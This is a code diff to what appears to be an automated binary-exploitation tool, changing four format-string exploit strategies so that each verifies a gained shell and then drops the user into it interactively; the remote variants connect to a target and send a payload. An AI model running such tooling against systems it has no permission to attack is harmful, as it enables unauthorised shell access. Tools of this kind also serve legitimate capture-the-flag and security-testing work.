@@ -167,18 +167,15 @@ class FmtstrX32LocalStrategy(ExploitStrategy):
             timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         )
 
-        from autopwn.report import record_success
-        record_success(info)
 
-        id_ok, id_output = verify_shell(io)
-
-        if not id_ok:
-
-            print_warning(f"FmtstrX32LocalStrategy: shell verification failed (no uid= output)")
-
+        verify_ok, verify_output = verify_shell(io, keep_alive=True)
+        from autopwn.core.shell_verify import record_success_verified
+        ok = record_success_verified(info, verify_ok, verify_output, ctx)
+        if not ok:
+            print_warning(f"FmtstrX32LocalStrategy: shell verification failed (no PWNED in shell output)")
             return False
-
-        ctx.id_output = id_output
+        ctx.id_output = verify_output
+        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
         return True
 
 
@@ -238,18 +235,15 @@ class FmtstrX64LocalStrategy(ExploitStrategy):
             timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         )
 
-        from autopwn.report import record_success
-        record_success(info)
 
-        id_ok, id_output = verify_shell(io)
-
-        if not id_ok:
-
-            print_warning(f"FmtstrX32LocalStrategy: shell verification failed (no uid= output)")
-
+        verify_ok, verify_output = verify_shell(io, keep_alive=True)
+        from autopwn.core.shell_verify import record_success_verified
+        ok = record_success_verified(info, verify_ok, verify_output, ctx)
+        if not ok:
+            print_warning(f"FmtstrX32LocalStrategy: shell verification failed (no PWNED in shell output)")
             return False
-
-        ctx.id_output = id_output
+        ctx.id_output = verify_output
+        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
         return True
 
 
@@ -298,7 +292,6 @@ class FmtstrX32RemoteStrategy(ExploitStrategy):
 
         io = remote(host, port)
         io.sendline(payload)
-        print_critical_helper("EXPLOITATION SUCCESSFUL! Dropping to shell...")
 
         buf_addr, offset = _resolve_fmtstr_inputs(ctx)
         info = ExploitInfo(
@@ -315,18 +308,15 @@ class FmtstrX32RemoteStrategy(ExploitStrategy):
             timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         )
 
-        from autopwn.report import record_success
-        record_success(info)
 
-        id_ok, id_output = verify_shell(io)
-
-        if not id_ok:
-
-            print_warning(f"FmtstrX32LocalStrategy: shell verification failed (no uid= output)")
-
+        verify_ok, verify_output = verify_shell(io, keep_alive=True)
+        from autopwn.core.shell_verify import record_success_verified
+        ok = record_success_verified(info, verify_ok, verify_output, ctx)
+        if not ok:
+            print_warning(f"FmtstrX32LocalStrategy: shell verification failed (no PWNED in shell output)")
             return False
-
-        ctx.id_output = id_output
+        ctx.id_output = verify_output
+        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
         return True
 
 
@@ -375,7 +365,6 @@ class FmtstrX64RemoteStrategy(ExploitStrategy):
 
         io = remote(host, port)
         io.sendline(payload)
-        print_critical_helper("EXPLOITATION SUCCESSFUL! Dropping to shell...")
 
         buf_addr, offset = _resolve_fmtstr_inputs(ctx)
         info = ExploitInfo(
@@ -392,18 +381,15 @@ class FmtstrX64RemoteStrategy(ExploitStrategy):
             timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         )
 
-        from autopwn.report import record_success
-        record_success(info)
 
-        id_ok, id_output = verify_shell(io)
-
-        if not id_ok:
-
-            print_warning(f"FmtstrX32LocalStrategy: shell verification failed (no uid= output)")
-
+        verify_ok, verify_output = verify_shell(io, keep_alive=True)
+        from autopwn.core.shell_verify import record_success_verified
+        ok = record_success_verified(info, verify_ok, verify_output, ctx)
+        if not ok:
+            print_warning(f"FmtstrX32LocalStrategy: shell verification failed (no PWNED in shell output)")
             return False
-
-        ctx.id_output = id_output
+        ctx.id_output = verify_output
+        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
         return True
 
 
